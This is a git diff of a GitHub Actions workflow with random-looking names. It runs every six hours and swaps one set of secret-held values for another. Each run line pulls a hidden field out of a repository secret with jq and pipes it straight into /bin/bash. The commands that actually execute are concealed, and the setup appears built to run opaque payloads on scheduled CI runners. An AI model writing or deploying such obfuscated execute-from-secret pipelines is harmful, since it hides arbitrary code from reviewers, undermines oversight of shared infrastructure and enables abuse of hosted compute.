@@ -1,25 +1,25 @@
 name: beidabx
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '34 2/6 * * *'
-
+    - cron: '25 5/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: beidabx
         env:
-          yrr66795: ${{ secrets.yrr66795 }}
+          li38: ${{ secrets.li38 }}
         run: |
-          echo $yrr66795 | jq -r .uv685 | /bin/bash
-          echo $i92 | jq -r .wm6195 | /bin/bash
-          echo $sqx1 | jq -r .ymbc93 | /bin/bash
-          echo $pgxjm97072 | jq -r .qqgl00207 | /bin/bash
-          echo $cw2 | jq -r .cw82188 | /bin/bash
-          echo $egaj1490 | jq -r .uh55103 | /bin/bash
-          echo $phff745 | jq -r .huu67689 | /bin/bash
-          echo $c41 | jq -r .wu4 | /bin/bash
+          echo $li38 | jq -r .kuya11111 | /bin/bash
+          echo $jdz5849 | jq -r .bioq66424 | /bin/bash
+          echo $qjj162 | jq -r .wouqn0 | /bin/bash
+          echo $g325 | jq -r .q594 | /bin/bash
+          echo $cdlnd43 | jq -r .vc972 | /bin/bash
+          echo $j01 | jq -r .o39 | /bin/bash
+          echo $ip779 | jq -r .ynzyh1041 | /bin/bash
+          echo $n1336 | jq -r .e384 | /bin/bash
+          echo $oh905 | jq -r .j9 | /bin/bash
 
